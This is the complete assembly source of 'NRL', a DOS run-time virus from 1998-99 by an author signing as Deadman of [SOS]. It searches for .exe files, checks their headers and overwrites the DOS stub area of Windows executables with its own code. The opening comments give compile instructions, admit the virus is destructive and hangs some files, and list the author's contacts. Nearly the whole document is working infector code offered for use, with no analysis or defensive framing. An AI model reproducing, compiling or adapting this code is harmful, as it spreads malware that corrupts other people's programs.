   ;  comment `
   ;
   ;  NRL Virus Copyright (C) 1998-99 by Deadman of [SOS]
   ;  Some virus feautures:
   ;    Being a simple DOS virus it infects only Windows Executables :)
   ;    This is run-time infector which is activated on executing a WinEXE from
   ;    Non-Win32 OS. It overwrites a shitty DOS area which tells you that this
   ;    program cannot be run in DOS mode. Destructive, hangs on many file types
   ;    run :(, for example, Multi-types, which can be run in Win and DOS mode.
   ;    But on "user" pc, where are only normal Win32 filez placed, works pretty
   ;    good!
   ;
   ;  Compile into .exe file
   ;  Virus size: 0C0h bytes - the most usual size between PE/NE/LE Header and
   ;    the end of the dos exe header
   ;  P.S. Virus has no comments, it seems to be very simple :)
   ;
   ;  Contacts:
   ;    dman@lgg.ru
   ;    www.lgg.ru/~dman
   ;                                                 Enjoy, Deadman.
   ;
   ; `
                           .286
                           model   tiny
                           codeseg
                           locals

    start:                 push    cs
                           pop     ds

                           mov     ah,4eh
                           mov     cl,20h
                           lea     dx,fmask
    fnext:                 int     21h
                           jc      return
                           push    es
                           pop     ds
                           mov     ax,3d02h
                           mov     dx,9eh
                           int     21h
                           push    cs
                           pop     ds
                           xchg    ax,bx
                           mov     ah,3fh
                           mov     cx,4096
                           mov     dl,offset buf
                           int     21h
                           xor     cx,ax
                           jnz     close

                           mov     ah,42h
                           cwd
                           int     21h

                           lea     si,buf+3ch
                           cmp     word ptr [si+2],ax
                           jnz     close
                           mov     ax,word ptr [si]
                           cmp     ax,4096
                           jae     close
                           cmp     byte ptr [si+18h-3ch],'@'
                           jne     close

                           mov     di,word ptr [si+08h-3ch]
                           shl     di,4
                           sub     ax,di
                           mov     cx,vsize
                           cmp     ax,cx
                           jb      close

                           xor     si,si
                           add     di,cx
                           push    es cs
                           pop     es
                           push    cx
                           rep     movsb
                           pop     di
                           add     di,0eh
                           xchg    ax,cx
                           stosw
                           stosw
                           scasw
                           stosw
                           stosw
                           pop     es

                           mov     ah,40h
                           mov     cx,4096
                           mov     dl,offset buf
                           int     21h

    close:                 mov     ah,3eh
                           int     21h
    ignore:                mov     ah,4fh
                           jmp     fnext
    return:                mov     ah,9
                           lea     dx,cannotberun
                           int     21h
                           mov     ax,4c01h
                           int     21h
    cannotberun            db      'This program cannot be run in DOS mode',0dh,0ah,24h
    fmask                  db      '*.exe',0
                           db      'NRL|Deadman/SOS'
    vsize                  equ     $-start
    buf:                   end     start
